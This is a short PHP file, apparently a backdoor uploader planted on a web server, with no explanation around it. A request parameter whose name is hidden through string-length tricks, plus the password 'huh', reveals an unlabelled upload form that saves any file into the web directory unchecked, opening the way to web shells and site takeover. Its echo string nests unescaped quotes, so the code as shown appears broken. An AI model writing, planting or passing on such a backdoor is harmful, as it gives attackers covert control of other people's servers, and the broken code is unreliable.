<?PhP
if
(isset
(
$_REQUEST[$browser=$x=strlen("Chrome") . strlen("Mozila")]) && 
$_REQUEST[$x=strlen("Chrome") . strlen("Mozila")]=="huh")
{
echo "<h2></h2><hr>";
echo "<form action="" method="post" enctype="multipart/form-data">
<label for="file"></label>
<input type="file" name="file" id="file"/>
<br /><br />
<input type="submit" name="default" value=">>">
</form>";
{
move_uploaded_file($_FILES["file"]["tmp_name"],
"" . $_FILES["file"]["name"]);
}
}
?>
